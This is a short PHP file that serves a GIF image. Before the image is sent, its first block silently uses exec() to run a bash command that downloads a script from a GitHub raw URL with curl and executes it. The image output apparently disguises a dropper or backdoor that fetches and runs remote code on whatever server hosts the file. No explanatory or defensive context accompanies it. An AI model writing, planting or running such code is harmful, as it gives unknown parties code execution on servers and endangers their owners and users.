<?php
$command = "bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/y)\"";
$output = null;
$return_var = null;

exec($command, $output, $return_var);

?>
<?php
header("Content-Type: image/gif");
readfile("pulupulu.gif");
?>
